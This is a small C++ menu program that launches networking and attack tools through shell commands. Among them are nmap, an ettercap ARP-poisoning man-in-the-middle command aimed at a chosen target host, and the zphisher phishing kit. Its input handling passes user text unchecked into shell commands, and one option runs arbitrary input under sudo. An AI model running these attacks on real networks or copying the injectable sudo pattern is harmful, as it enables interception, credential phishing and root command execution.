#include <iostream>

int menu_option = 4;
int ip_adress1;
int ngrok_port;
int stop = 2;

void menu()
{
    system("clear");
    std::cout << "Welcome to Networking pack, select an option please\n";
    std::cout << "\n";
    std::cout << "-------------------------------------------------------|\n";
    std::cout << "0. Exit                                                |\n";
    std::cout << "1. Requiries                                           |\n";
    std::cout << "2. Ping IPv4                                           |\n";
    std::cout << "3. Set up port forwarding service(Ngrok)               |\n";
    std::cout << "4. Nmap scans                                          |\n";
    std::cout << "5. Arp poison(no proxychains)                          |\n";
    std::cout << "6. Open Wireshark with root perms                      |\n";
    std::cout << "7. Open fishing tool(zphisher)                         |\n";
    std::cout << "------------------------------------------------------/\n";
    std::cin >> menu_option;

    if (menu_option == 0)
    {
        system("clear");
        exit(0);
    }

    if (menu_option == 1)
    {
        std::cout << "------------\n";
        std::cout << "1. Ngrok\n";
        std::cout << "2. Nmap\n";
        std::cout << "3. Ettercap\n";
        std::cout << "4. Wireshark\n";
        std::cout << "5. Zphisher\n";
        std::cout << "------------\n";
    }

    else if (menu_option == 2)
    {
        system("clear");
        char ip_address[100];
        printf("Enter IP address to ping: ");
        scanf("%s", ip_address);

        char command[100];
        snprintf(command, sizeof(command), "ping %s", ip_address);

        int return_code = system(command);
    }

    else if (menu_option == 3)
    {
        system("clear");

        char ngrok_port1[100];

        printf("Enter the port you want to use a port forwarding service for: ");
        scanf("%s", ngrok_port1);

        char command[100];
        snprintf(command, sizeof(command), "ngrok http  %s", ngrok_port1);

        int return_code = system(command);
    }
    else if (menu_option == 4)
    {

        system("clear");
        char nmap_options1[100];
        printf("Enter options for nmap scan(full syntax, root perms already included!!): ");
        scanf("%s", nmap_options1);
        char command[100];
        snprintf(command, sizeof(command), "sudo  %s", nmap_options1);
        int return_code = system(command);
    }
    else if (menu_option == 5)
    {

        system("clear");
        char command[200];
        char arppoison1[100];
        char arppoison2[100];
        std::cout << "Enter the ip adress of the local router: \n";
        std::cout << "\n";
        scanf("%s", arppoison1);
        std::cout << "Enter the ip adress of the target host: \n";
        scanf("%s", arppoison2);

        snprintf(command, sizeof(command), "sudo ettercap -T -S -i en0 -M arp:remote /%s// /%s//", arppoison1, arppoison2);
        int return_code = system(command);
    }
    else if (menu_option == 6)
    {
        system("clear");
        system("sudo open /Applications/Wireshark.app");
    }
    else if (menu_option == 7) {
        system("clear");
        system("./zphisher.sh");
    }
}

int main()
{
    menu();
}
